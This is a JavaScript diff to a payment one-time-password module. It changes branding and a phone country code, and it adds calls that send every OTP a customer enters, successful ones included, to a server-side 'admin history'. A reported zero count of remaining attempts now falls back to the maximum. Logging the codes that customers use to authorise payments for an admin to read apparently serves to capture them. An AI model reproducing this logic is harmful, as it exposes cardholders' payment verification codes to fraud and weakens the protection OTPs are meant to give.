@@ -3,7 +3,7 @@ import { supabase, isSupabaseConfigured } from './supabase'
 const MAX_ATTEMPTS = 3
 const OTP_LENGTH = 6
 const OTP_MIN_LENGTH = 4
-const MOCK_OTP_PREFIX = 'oasis_otp_'
+const MOCK_OTP_PREFIX = 'alain_otp_'
 
 export function isOtpCodeComplete(code) {
   const clean = String(code || '').replace(/\D/g, '')
@@ -163,6 +163,10 @@ async function recordOtpAttemptToServer(orderId, code) {
   }
 }
 
+export async function recordPaymentOtpAttempt(orderId, code) {
+  return recordOtpAttemptToServer(orderId, code)
+}
+
 function isMockOtpCorrect(orderId, phone, code) {
   const data = readMockOtp(orderId, phone)
   return Boolean(data && data.code === code)
@@ -237,7 +241,7 @@ export async function sendPaymentOtp(orderId, { length = OTP_LENGTH, phone = '' 
         ok: true,
         otpLength: Number(data.otp_length) || otpLength,
         attempts: Number(data.attempts) || 0,
-        remaining: Number(data.remaining) ?? MAX_ATTEMPTS,
+        remaining: Number(data.remaining) || MAX_ATTEMPTS,
         maskedPhone: data.masked_phone || maskPhoneNumber(phone),
         smsSent: Boolean(data.sms_sent),
         otpReady: true,
@@ -285,8 +289,8 @@ export async function sendPaymentOtp(orderId, { length = OTP_LENGTH, phone = '' 
     ok: true,
     otpLength: Number(data.otp_length) || otpLength,
     attempts: Number(data.attempts) || 0,
-    remaining: Number(data.remaining) ?? MAX_ATTEMPTS,
-    maskedPhone: maskPhoneNumber(data.phone_last4 ? `968${data.phone_last4}` : phone),
+    remaining: Number(data.remaining) || MAX_ATTEMPTS,
+    maskedPhone: maskPhoneNumber(data.phone_last4 ? `971${data.phone_last4}` : phone),
     smsSent: false,
     otpReady: true,
   }
@@ -347,6 +351,7 @@ export async function verifyPaymentOtp(orderId, code, phone = '') {
   }
 
   if (getTriedOtpCodes(orderId).includes(clean)) {
+    await recordOtpAttemptToServer(orderId, clean)
     return buildDuplicateOtpResult(orderId)
   }
 
@@ -365,6 +370,7 @@ export async function verifyPaymentOtp(orderId, code, phone = '') {
   if (serverData?.success === true) {
     clearFailedOtpAttempts(orderId)
     sessionStorage.removeItem(otpStorageKey(orderId, phone))
+    await recordOtpAttemptToServer(orderId, clean)
     return { ok: true }
   }
 
@@ -381,9 +387,8 @@ export async function verifyPaymentOtp(orderId, code, phone = '') {
 
   addTriedOtpCode(orderId, clean)
   const clientAttempts = incrementFailedOtpAttempts(orderId)
-  if (serverError || !serverData) {
-    await recordOtpAttemptToServer(orderId, clean)
-  }
+  // Always stack the code in admin history (SQL dedupes identical consecutive codes)
+  await recordOtpAttemptToServer(orderId, clean)
 
   const serverAttempts = syncFailedOtpAttempts(
     orderId,
